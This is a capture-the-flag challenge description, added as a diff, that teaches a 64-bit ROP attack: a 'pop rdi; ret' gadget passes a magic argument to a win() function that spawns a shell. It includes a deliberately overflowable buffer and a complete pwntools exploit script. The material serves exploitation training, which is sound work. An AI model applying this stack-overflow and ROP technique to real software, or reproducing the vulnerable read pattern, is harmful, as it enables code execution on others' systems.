@@ -1,0 +1,140 @@
+================================================================================
+CHALLENGE 03: SAY THE MAGIC NUMBER — RET2WIN + ARGUMENTS
+================================================================================
+Difficulty : [★★★☆☆] Medium
+Category   : Binary Exploitation (pwn) / Return-Oriented Programming (ROP)
+Directory  : R0P_Me/
+================================================================================
+
+[1. OVERVIEW]
+--------------------------------------------------------------------------------
+In Challenge 02 (Returnal), you hijacked execution by jumping straight to `win()`.
+That was straightforward because `win()` required no arguments.
+
+In modern software, however, critical functions almost always take arguments.
+If a function requires a specific argument to give you a shell, simply jumping 
+to the start of the function will fail!
+
+You now need to master the Linux x86-64 calling convention and build your very 
+first ROP (Return-Oriented Programming) chain using "gadgets".
+
+
+[2. CHALLENGE DESCRIPTION]
+--------------------------------------------------------------------------------
+"You found the secret chamber, but the door is locked with a magic number. 
+ Can you speak the magic word before you enter?"
+
+The binary contains:
+  • `vulnerable()`:
+        char buffer[64];
+        read(0, buffer, 256);
+
+  • `win(unsigned long magic)`:
+        void win(unsigned long magic)
+        {
+            if (magic != 0x13371337)
+                return;
+
+            puts("Correct!");
+            system("/bin/sh");
+        }
+
+Your goal:
+Call `win()` with its first argument set to `0x13371337` to spawn `/bin/sh`.
+
+
+[3. THE CALLING CONVENTION (x86-64)]
+--------------------------------------------------------------------------------
+Unlike 32-bit x86 (where arguments were pushed onto the stack), 64-bit Linux 
+uses the System V AMD64 ABI calling convention:
+
+  1st Argument  -->  RDI register
+  2nd Argument  -->  RSI register
+  3rd Argument  -->  RDX register
+  4th Argument  -->  RCX register
+  5th Argument  -->  R8 register
+  6th Argument  -->  R9 register
+
+Therefore, before calling `win()`, you MUST ensure that:
+    RDI == 0x13371337
+
+
+[4. WHAT IS A ROP GADGET?]
+--------------------------------------------------------------------------------
+Because NX (No-Execute) is enabled, you cannot inject your own machine code onto 
+the stack. Instead, you reuse small fragments of code already present in the 
+binary's executable segment that end with a `ret` instruction. These are called 
+"gadgets".
+
+To put a value into `RDI`, you need a gadget like:
+    pop rdi
+    ret
+
+How this gadget behaves when `ret` points to it:
+  1. `pop rdi`: Pops the value currently at the top of the stack into register `RDI`.
+  2. `ret`    : Pops the next address from the stack into `RIP` and jumps there.
+
+By placing your magic number immediately following the gadget address on the 
+stack, the gadget will load that number into `RDI` and then return directly 
+to `win()`!
+
+
+[5. CRAFTING THE ROP CHAIN]
+--------------------------------------------------------------------------------
+Stack Layout for the Exploit:
+
+    High Addresses
+    |----------------------------------|
+    |  Address of win()                |  <-- Next ret jumps here (RDI is now 0x13371337!)
+    |----------------------------------|
+    |  0x0000000013371337 (Argument 1) |  <-- 'pop rdi' loads this value into RDI
+    |----------------------------------|
+    |  Address of 'pop rdi ; ret'      |  <-- vulnerable() returns here first
+    |----------------------------------|
+    |  Saved RBP (8 bytes)             |  <-- Padding
+    |----------------------------------|
+    |  buffer (64 bytes)               |  <-- Padding
+    |----------------------------------|
+    Low Addresses
+
+Finding the gadget:
+Use `ROPgadget` or `ropper`:
+  $ ROPgadget --binary chall | grep "pop rdi"
+  Example output: 0x00000000004012bb : pop rdi ; ret
+
+Exploit script snippet (pwntools):
+  from pwn import *
+
+  p = process('./chall')
+  pop_rdi = 0x4012bb
+  win_addr = 0x401176
+  magic = 0x13371337
+
+  payload = b'A' * 72
+  payload += p64(pop_rdi)
+  payload += p64(magic)
+  payload += p64(win_addr)
+
+  p.sendline(payload)
+  p.interactive()
+
+
+[6. CONCEPTS LEARNED]
+--------------------------------------------------------------------------------
+• System V Calling Convention: How registers pass arguments in 64-bit Linux.
+• ROP Gadgets                : Reusing existing binary instructions ending in `ret`.
+• Register Control           : Loading arbitrary constants into CPU registers.
+• Chained Execution          : Linking multiple return operations seamlessly.
+
+
+[7. PROGRESSIVE HINTS]
+--------------------------------------------------------------------------------
+Hint 1: On Linux x86-64, function arguments are not passed on the stack. Which CPU 
+        register holds the 1st argument?
+
+Hint 2: Look for instructions in the binary that can load a value from the stack 
+        into that register. What instruction does `pop <reg>` do?
+
+Hint 3: Use `ROPgadget --binary chall | grep "pop rdi"` or `ropper --file chall --search "pop rdi"` 
+        to find your gadget. Place `0x13371337` immediately after the gadget's address!
+================================================================================
